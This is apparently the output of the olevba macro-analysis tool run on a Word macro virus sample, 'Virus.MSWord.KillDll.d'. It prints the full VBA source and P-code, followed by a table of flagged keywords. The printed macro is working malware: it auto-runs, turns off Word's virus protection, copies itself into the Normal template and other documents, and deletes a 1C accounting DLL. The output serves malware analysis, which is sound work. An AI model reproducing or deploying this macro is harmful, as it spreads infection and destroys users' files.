olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillDll.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.KillDll.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Infection.bas 
in file: Virus.MSWord.KillDll.d - OLE stream: 'Macros/VBA/Infection'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Ifc1, Ifc2 As Boolean

Sub AutoClose()
 Call Infect
End Sub
Sub AutoNew()
 Call Infect
End Sub

Sub Document_Open()
 Call Infect
End Sub

Sub Document_New()
 Call Infect
End Sub

Sub Document_Close()
Dim Str As String
Dim MyStamp As Date
Call Infect
Str = Dir("c:\Program Files\1cv77\bin\basic.dll")
If Str <> "" Then
 MyStamp = FileDateTime("c:\Program Files\1cv77\bin\basic.dll")
 If MyStamp > "1.1.00 00:00:00" Then
  Kill "c:\Program Files\1cv77\bin\basic.dll"
 End If
End If
If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
ActiveDocument.Saved = havesave
End Sub

Sub Infect()
Ifc1 = True
Ifc2 = True
 Options.VirusProtection = False
 x1 = Application.StartupPath + "\Normal1.tmp"
 x2 = Application.StartupPath + "\Normal2.tmp"
If Documents.Count >= 1 Then
  counter1 = NormalTemplate.VBProject.VBComponents.Count
  counter2 = ActiveDocument.VBProject.VBComponents.Count
   For i = 1 To counter2
   If ActiveDocument.VBProject.VBComponents.Item(i).Name = "Infection" Then Ifc2 = False
  Next i
  For i = 1 To counter1
   If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Infection" Then Ifc1 = False
  Next i
   
  If Ifc2 Then
   GoSub a9
  End If
  
  If Ifc1 Then
   ActiveDocument.VBProject.VBComponents("Infection").Export (x1)
  End If
  
  If Ifc2 Then
   ActiveDocument.VBProject.VBComponents.Import (x2)
  End If
  
  If Ifc1 Then
   GoSub a8
  End If
  
 havesave = ActiveDocument.Saved
End If

Exit Sub

a8:
   NormalTemplate.VBProject.VBComponents.Import (x1)
Return
a9:
   NormalTemplate.VBProject.VBComponents("Infection").Export (x2)
Return
End Sub

Rem Sub ViewVBCode()
Rem   MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.KillDll.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Infection - 4143 bytes
' Line #0:
' 	Dim 
' 	VarDefn Ifc1
' 	VarDefn Ifc2 (As Boolean)
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoClose())
' Line #3:
' 	ArgsCall (Call) Infect 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Sub AutoNew())
' Line #6:
' 	ArgsCall (Call) Infect 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Sub Document_Open())
' Line #10:
' 	ArgsCall (Call) Infect 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' 	FuncDefn (Sub Document_New())
' Line #14:
' 	ArgsCall (Call) Infect 0x0000 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Sub Document_Close())
' Line #18:
' 	Dim 
' 	VarDefn Str (As String)
' Line #19:
' 	Dim 
' 	VarDefn MyStamp (As Date)
' Line #20:
' 	ArgsCall (Call) Infect 0x0000 
' Line #21:
' 	LitStr 0x0024 "c:\Program Files\1cv77\bin\basic.dll"
' 	ArgsLd Dir 0x0001 
' 	St Str 
' Line #22:
' 	Ld Str 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0024 "c:\Program Files\1cv77\bin\basic.dll"
' 	ArgsLd FileDateTime 0x0001 
' 	St MyStamp 
' Line #24:
' 	Ld MyStamp 
' 	LitStr 0x000F "1.1.00 00:00:00"
' 	Gt 
' 	IfBlock 
' Line #25:
' 	LitStr 0x0024 "c:\Program Files\1cv77\bin\basic.dll"
' 	ArgsCall Kill 0x0001 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld havesave 
' 	Ld infected 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld havesave 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Sub Infect())
' Line #35:
' 	LitVarSpecial (True)
' 	St Ifc1 
' Line #36:
' 	LitVarSpecial (True)
' 	St Ifc2 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #38:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Normal1.tmp"
' 	Add 
' 	St x1 
' Line #39:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Normal2.tmp"
' 	Add 
' 	St x2 
' Line #40:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter1 
' Line #42:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter2 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter2 
' 	For 
' Line #44:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Infection"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Ifc2 
' 	EndIf 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter1 
' 	For 
' Line #47:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Infection"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Ifc1 
' 	EndIf 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' Line #50:
' 	Ld Ifc2 
' 	IfBlock 
' Line #51:
' 	GoSub a9 
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	Ld Ifc1 
' 	IfBlock 
' Line #55:
' 	Ld x1 
' 	Paren 
' 	LitStr 0x0009 "Infection"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	Ld Ifc2 
' 	IfBlock 
' Line #59:
' 	Ld x2 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #60:
' 	EndIfBlock 
' Line #61:
' Line #62:
' 	Ld Ifc1 
' 	IfBlock 
' Line #63:
' 	GoSub a8 
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St havesave 
' Line #67:
' 	EndIfBlock 
' Line #68:
' Line #69:
' 	ExitSub 
' Line #70:
' Line #71:
' 	Label a8 
' Line #72:
' 	Ld x1 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #73:
' 	Return 
' Line #74:
' 	Label a9 
' Line #75:
' 	Ld x2 
' 	Paren 
' 	LitStr 0x0009 "Infection"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #76:
' 	Return 
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' 	Rem 0x0011 " Sub ViewVBCode()"
' Line #80:
' 	Rem 0x0027 "   MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")"
' Line #81:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |basic.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

